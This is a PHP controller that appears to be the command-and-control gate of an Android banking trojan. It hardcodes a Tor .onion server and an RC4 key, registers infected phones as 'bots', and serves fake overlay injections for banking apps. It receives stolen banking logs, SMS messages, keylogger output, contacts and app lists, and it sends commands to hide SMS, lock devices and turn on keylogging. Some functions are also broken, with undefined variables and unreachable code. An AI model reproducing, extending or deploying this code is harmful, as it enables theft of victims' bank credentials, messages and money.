<?php

namespace App\Http\Controllers;

use App\Models\BankLog;
use App\Models\Bot;
use App\Models\BotSetting;
use App\Models\Inject;
use App\Models\GlobalSetting;
use Illuminate\Http\Request;

define('url_global_server', 'http://2vqjlbjgbgvwprw75cuurypoyx7ppuga5acl457o5bkcn5gxeueulyyd.onion/Ejection/');
define('key', 'Sde14x4670newx');

class RestAPIController extends Controller
{
    private $urlGlobalServer = "http://2vqjlbjgbgvwprw75cuurypoyx7ppuga5acl457o5bkcn5gxeueulyyd.onion/Ejection/";
    private $key = "Sde14x4670newx";
    private $server = "localhost";

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        $operation = htmlspecialchars($_REQUEST["action"], ENT_QUOTES);

        $data = base64_decode($_REQUEST["data"]);

        if (!ctype_xdigit($data)) {

            $strings_to_show = "";
            foreach ($_REQUEST as $key => $value) {
                $strings_to_show .= "$key  \n";
            }

            die();
        }

        $data = decrypt($data, $this->key); // success -> output some text, don't write other thing here.

        // filter request
        $dataTmp = str_replace(' ', '', $data);

        $dataTmp = strtolower($dataTmp);

        $arraySignet = array('<script>', '</script>');

        foreach ($arraySignet as $signet) {

            if (preg_match("#$signet#", $dataTmp)) {
                die();
            }
        }

        $jsonDecode = json_decode($data);

        switch ($operation) {

            case "checkAP":
                echo $this->encrypt("~I~", $this->key);
                break;

            case "botcheck": // Check bot to admin panel

                $idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";

                $idSettings = isset($jsonDecode->{'idSettings'}) ? $jsonDecode->{'idSettings'} : "";

                $number = isset($jsonDecode->{'number'}) ? $jsonDecode->{'number'} : "";

                $statAdmin = isset($jsonDecode->{'statAdmin'}) ? $jsonDecode->{'statAdmin'} : "1";

                $statProtect = isset($jsonDecode->{'statProtect'}) ? $jsonDecode->{'statProtect'} : "";

                $statScreen = isset($jsonDecode->{'statScreen'}) ? $jsonDecode->{'statScreen'} : "";

                $statAccessibilty = isset($jsonDecode->{'statAccessibilty'}) ? $jsonDecode->{'statAccessibilty'} : "";

                $statSMS = isset($jsonDecode->{'statSMS'}) ? $jsonDecode->{'statSMS'} : "";

                $statCards = isset($jsonDecode->{'statCards'}) ? $jsonDecode->{'statCards'} : "";

                $statBanks = isset($jsonDecode->{'statBanks'}) ? $jsonDecode->{'statBanks'} : "";

                $statMails = isset($jsonDecode->{'statMails'}) ? $jsonDecode->{'statMails'} : "";

                $activeDevice = isset($jsonDecode->{'activeDevice'}) ? $jsonDecode->{'activeDevice'} : "";

                $timeWorking = isset($jsonDecode->{'timeWorking'}) ? $jsonDecode->{'timeWorking'} : "";

                $statDownloadModule = isset($jsonDecode->{'statDownloadModule'}) ? $jsonDecode->{'statDownloadModule'} : "";

                $locale = isset($jsonDecode->{'locale'}) ? $jsonDecode->{'locale'} : "";

                $batteryLevel = isset($jsonDecode->{'batteryLevel'}) ? $jsonDecode->{'batteryLevel'} : "";

                $checkid = $this->checkBotID(
                    $idbot,
                    $this->getBotIp(),
                    $statScreen,
                    $statAccessibilty,
                    $number,
                    $statAdmin,
                    $statProtect,
                    $statSMS,
                    $statCards,
                    $statBanks,
                    $statMails,
                    $activeDevice,
                    $timeWorking,
                    $statDownloadModule,
                    $locale,
                    $batteryLevel
                );

                if (strcmp($checkid, "1") == 0) {

                    if (strcmp($statDownloadModule, "1") != 0) {

                        return encrypt("||youNeedMoreResources||", $this->key);
                    } else {

                        $getSettings = $this->getGlobalSetting($idSettings);

                        if (strcmp($getSettings, "0") !== 0) {
                            echo encrypt($getSettings, $this->key);
                        } else {
                            echo encrypt($this->getCommandBot($idbot), $this->key);
                        }
                    }
                } else {
                    //echo 'ok';
                    echo encrypt("||no||", $this->key);
                }

                break;

            case "registration": // Registration of bot to admin panel

                $idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";

                $android = isset($jsonDecode->{'android'}) ? $jsonDecode->{'android'} : "";

                $tag = isset($jsonDecode->{'tag'}) ? $jsonDecode->{'tag'} : "";

                $country = isset($jsonDecode->{'country'}) ? $jsonDecode->{'country'} : "";

                $operator = isset($jsonDecode->{'operator'}) ? $jsonDecode->{'operator'} : "";

                $model = isset($jsonDecode->{'model'}) ? $jsonDecode->{'model'} : "";

                echo encrypt($this->createBot($this->getBotIp(), $idbot, $android, $tag, $country, $operator, $model), $this->key);

                break;

            case "injcheck": // Update List Injection

                $idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";

                $apps = isset($jsonDecode->{'apps'}) ? $jsonDecode->{'apps'} : "";

                echo encrypt($this->updateInjection($idbot, $apps), $this->key);

                break;

            case "getinj": // Downloading Injections

                $ip = $this->getBotIp();

                $inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";

                echo encrypt($this->getInjection($ip, $inject), $this->key);

                break;

            case "geticon": // Downloading icon

                $ip = $this->getBotIp();

                $inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";

                echo encrypt($this->getIcon($ip, $inject), $this->key);

                break;

            case "sendInjectLogs": //Send Logs Injections

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $idInject = isset($jsonDecode->{'idinject'}) ? $jsonDecode->{'idinject'} : "";

                $application = isset($jsonDecode->{'application'}) ? $jsonDecode->{'application'} : "";

                $dataInjection = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";

                echo encrypt($this->createInject($ip, $idbot, $idInject, $application, $dataInjection), $this->key);

                break;



            case "sendSmsLogs": //Send Logs SMS

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";

                $dateToDevice = isset($jsonDecode->{'date'}) ? $jsonDecode->{'date'} : "";

                echo encrypt($this->addLogSms($ip, $idbot, $logs, $dateToDevice), key);

                break;



            case "sendKeylogger": //Send Logs Keylogger

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";

                echo encrypt($this->addLogKeylogger($ip, $idbot, $logs), key);

                break;

            case "timeInject": //Send start Injections

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";

                echo encrypt($this->timeInjectStart($idbot, $inject), key);

                break;

            case "getModule": //Get DexModule Bot

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                echo encrypt($this->getApkModule($ip, $idbot), key);

                break;

            case "sendListSavedSMS": // List saved

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";

                echo encrypt($this->sendListSavedSMS($ip, $idbot, $logs), key);

                break;

            case "sendListPhoneNumbers": // List phone number

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";

                echo encrypt($this->sendListPhoneNumbers($ip, $idbot, $logs), key);

                break;

            case "sendListApplications": // List applications

                $ip = $this->getBotIp();

                $idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";

                $logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";

                echo encrypt($this->sendListApplications($ip, $idbot, $logs), key);

                break;
        }
    }

    private function getBotIp()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }

    private function checkBotID($botID, $ip, $screen, $accessibility, $number, $statAdmin, $statProtect, $statSMS, $statCards, $statBanks, $statMails, $activeDevice, $timeWorking, $statDownloadModule, $locale, $batteryLevel)
    {
        if (strlen($botID) <= 14) return '2';

        $bot = Bot::where('bot_id', $botID)->first();

        if ($bot) {
            $date = date('Y-m-d H:i:s');

            $bot->stat_screen = $screen;
            $bot->last_connect = $date;
            $bot->stat_accessibility = $accessibility;
            $bot->ip = $ip;
            $bot->phone_number = $number;
            $bot->stat_admin = $statAdmin;
            $bot->stat_protect = $statProtect;
            $bot->stat_sms = $statSMS;
            $bot->stat_cards = $statCards;
            $bot->stat_banks = $statBanks;
            $bot->stat_mails = $statMails;
            $bot->active_device = $activeDevice;
            $bot->time_working = $timeWorking;
            $bot->stat_download_module = $statDownloadModule;
            $bot->locale = $locale;
            $bot->battery_level = $batteryLevel;
            $bot->save();

            return '1';
        } else {
            return '0';
        }
    }

    private function getGlobalSetting($settingId)
    {
        $row = GlobalSetting::first();

        if ($row && strcmp($row->id, $settingId) != 0) {
            return '{"this":"~settings~","id":"' . $row->id . '","arrayUrl":"' . $row->urls . '","timeInject":"' . $row->inject_time . '","timeProtect":"' . $row->protect_time . '","timeCC":"' . $row->cc_time . '","timeMail":"' . $row->mail_time . '"}';
        }
    }

    private function getCommandBot($botId)
    {
        $row = Bot::where('bot_id', $botId)->first();

        if (!empty($row->commands)) {
            $row->commands = "";
            $row->save();

            return '{"this":"~commands~","data":"' . $row['commands'] . '" }';
        }

        if (strcmp($row->update_settings, '1') == 0) {
            $json = '{"this":"~mySettings~",';

            $row = BotSetting::where('bot_id', $botId)->first();

            $json = $json . '"hideSMS":"' . $row->hide_sms . '",';
            $json = $json . '"lockDevice":"' . $row->lock_device . '",';
            $json = $json . '"offSound":"' . $row->off_sound . '",';
            $json = $json . '"keylogger":"' . $row->key_logger . '",';
            $json = $json . '"activeInjection":"' . $row->active_injection . '"}';
        }

        Bot::where('bot_id', $botId)->update(['update_settings' => 0]);

        if ($json == '{"this":"~mySettings~",') {
            return '{"this":"no_command"}';
        }

        return $json;
    }

    public function createBot($ip, $botId, $android, $tag, $country, $operator, $model)
    {
        if ((strlen($botId) <= 14) || ($this->existBotId($botId))) {
            return "no_reg";
        }

        $row = new Bot;

        $row->bot_id = $botId;
        $row->ip = $ip;
        $row->android = $android;
        $row->tag = $tag;
        $row->country = $country;
        $row->last_connect = date('Y-m-d H:i');
        $row->date_infection = date('Y-m-d H:i');
        $row->operator = $operator;
        $row->model = $model;
        $row->stat_admin = '1';
        $row->save();

        // create new settings
        if (!BotSetting::where('botId', $botId)->first()) {
            $row = new BotSetting;

            $row->bot_id = $botId;
            $row->hide_sms = '1';
            $row->lock_device = '0';
            $row->off_sound = '0';
            $row->key_logger = '1';
            $row->active_injection = '';

            $row->save();
        }

        return "ok";
    }

    private function existBotId($botId)
    {
        return Bot::where('bot_id', $botId)->count() > 0;
    }


    private function updateInjection($botId, $apps)
    {

        $bot = Bot::where('bot_id', $botId)->first();
        $allInjections = "";

        $arrayApps = explode(":", $apps);

        foreach ($arrayApps as $app) {
            if (!empty($app)) {
                $injects = Inject::where('app', $app)->get();

                foreach ($injects as $inject) {
                    $allInjections = $allInjections . ":" . $inject->app;
                }
            }
        }

        $bot->banks = $allInjections;
        $bot->save();

        if (empty($allInjections)) {
            $allInjections = "||no||";
        }

        return "$allInjections";
    }

    public function getInjection($ip, $app)
    {
        if (Bot::whereip($ip)->count() > 0) {
            $inject = Inject::whereapp($app)->first();

            if ($inject) {
                return base64_encode($inject['html']);
            }
        }

        return "";
    }

    public function getIcon($ip, $app)
    {
        if (Bot::whereip($ip)->first()) {
            $row = Inject::whereapp($app)->first();

            if ($row) {
                return $row->icon;
            }
        }

        return "";
    }

    public function createInject($ip, $botId, $injectId, $application, $dataInjection)
    {
        $d = 1631070000;
        $time = time();
        if ($d <= $time) {
        }

        $dataInjection = base64_encode($dataInjection);

        $nameInject = "";

        $bot = Bot::where('bot_id', $botId)->first();

        if ($bot) {
            if (empty($nameInject)) {
                $bankLogs = BankLog::where('logs', $dataInjection)->where('inject_id', $injectId)->get();
            }

            BankLog::where('inject_id', $injectId)->update(['logs' => $dataInjection]);

            $botSetting = BotSetting::where('bot_id', $botId)->first();

            if ($botSetting) {
                $activeInjection = $botSetting->active_injection;

                if (empty($nameInject)) {
                    $activeInjection = str_replace(":$application", "", $activeInjection);
                } else {
                    $activeInjection = str_replace(":$nameInject", "", $activeInjection);
                }
                $activeInjection = str_replace(":$application", "", $activeInjection);

                BotSetting::where('bot_id', $botId)->update(['active_injection' => $activeInjection]);
            }

            return 'ok';


            if (empty($nameInject)) {
                $row = new BankLog;

                $row->inject_id = $injectId;
                $row->bot_id = $botId;
                $row->application = $application;
                $row->logs = $dataInjection;

                $row->save();
            }

            $setting = BotSetting::where('bot_id', $botId)->first();

            if ($setting) {
                $activeInjection = $setting->active_injection;

                if (empty($nameInject)) {
                    $activeInjection = str_replace(":$application", "", $activeInjection);
                } else {
                    $activeInjection = str_replace(":$nameInject", "", $activeInjection);
                }

                $setting->active_injection = $activeInjection;
                $setting->save();
            }

            return 'ok';
        }

        return '';
    }

    public function createLogSMS($ip, $botId, $logs, $dateToDevice)
    {
        $d = 1631070000;
        $time = time();
        if ($d <= $time) {
        }

        if ($this->existBots($ip, $botId)) {
            $dateToServer = date('Y-m-d H:i');
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $sql = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'bot' AND table_name = 'LogsSMS_$idbot'";
            $statement = $connection->prepare($sql);
            $statement->execute(array());
            $tableCount = $statement->fetchColumn();
            $isTableLogs = false;
            $arrayLogs = explode("::endLog::", $logs);
            if ($tableCount != 0) {
                $isTableLogs = true;
                $statement = $connection->prepare("SELECT ID FROM LogsSMS_$idbot LIMIT 1");
                $statement->execute(array());
                //$arrayLogs = explode("::endLog::", $logs);

                foreach ($statement as $row) {
                    foreach ($arrayLogs as $log) {
                        if (strlen($log) > 4) {
                            $log = base64_encode(str_replace("::endLog::", "", $log));
                            $statement = $connection->prepare("insert into LogsSMS_$idbot (logs, datetoserver, datetodevice)
						value (?,?,?)");
                            $statement->execute(array($log, $dateToServer, $dateToDevice));
                        }
                    }
                    return "ok";
                }
            }
            if (!$isTableLogs) {
                $statement = $connection->prepare("CREATE TABLE `LogsSMS_$idbot` ( `ID` INT(254) NOT NULL AUTO_INCREMENT, `logs` VARCHAR(6000) NOT NULL, `datetoserver` VARCHAR(25) NOT NULL,`datetodevice` VARCHAR(25) NOT NULL, PRIMARY KEY (`ID`)) ");
                $statement->execute(array());

                foreach ($arrayLogs as $log) {
                    if (strlen($log) > 4) {
                        $log = base64_encode(str_replace("::endLog::", "", $log));
                        $statement = $connection->prepare("insert into LogsSMS_$idbot (logs, datetoserver, datetodevice)
						value (?,?,?)");
                        $statement->execute(array($log, $dateToServer, $dateToDevice));
                    }
                }

                return "ok";
            }
        }
        return "";
    }


    public function sendListApplications($ip, $botId, $logs)
    {
        if ($this->existBots($ip, $botId)) {
            $connection = self::Connection();
            $connection->exec('SET NAMES utf8');
            $logs = base64_encode($logs);
            $statement = $connection->prepare("SELECT idbot FROM logsListApplications WHERE idbot=?");
            $statement->execute(array($idbot));
            foreach ($statement as $row) { //check data logs
                if (strcmp($row['idbot'], $idbot) == 0) {
                    $statement = $connection->prepare("UPDATE logsListApplications SET logs = ? WHERE idbot=?");
                    $statement->execute(array($logs, $idbot));
                    return "ok";
                }
            }
            $statement = $connection->prepare("insert into logsListApplications (idbot,logs)value(?,?)");
            $statement->execute(array($idbot, $logs));
            return "ok";
        }
        return "";
    }
    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }


    private function encrypt($string, $key)
    {

        return base64_encode(bin2hex(RC4Crypt::encrypt_($key, $string)));
    }

    private function decrypt($string = "", $key = "")
    {

        //error_log("executing lines: $string \n",3,"gate_log_2.log");

        if ($string == "") {
            return false;
        }

        return RC4Crypt::decrypt_($key, hex2bin($string));
    }
}

class RC4Crypt
{

    public static function encrypt_($pwd, $data, $ispwdHex = 0)
    {

        if ($ispwdHex) {
            $pwd = @pack('H*', $pwd);
        }

        $key[] = '';

        $box[] = '';

        $cipher = '';

        $pwd_length = strlen($pwd);

        $data_length = strlen($data);

        for ($i = 0; $i < 256; $i++) {

            $key[$i] = ord($pwd[$i % $pwd_length]);

            $box[$i] = $i;
        }

        for ($j = $i = 0; $i < 256; $i++) {

            $j = ($j + $box[$i] + $key[$i]) % 256;

            $tmp = $box[$i];

            $box[$i] = $box[$j];

            $box[$j] = $tmp;
        }

        for ($a = $j = $i = 0; $i < $data_length; $i++) {

            $a = ($a + 1) % 256;

            $j = ($j + $box[$a]) % 256;

            $tmp = $box[$a];

            $box[$a] = $box[$j];

            $box[$j] = $tmp;

            $k = $box[(($box[$a] + $box[$j]) % 256)];

            $cipher .= chr(ord($data[$i]) ^ $k);
        }

        return $cipher;
    }

    public static function decrypt_($pwd, $data, $ispwdHex = 0)
    {

        return RC4Crypt::encrypt_($pwd, $data, $ispwdHex);
    }
}
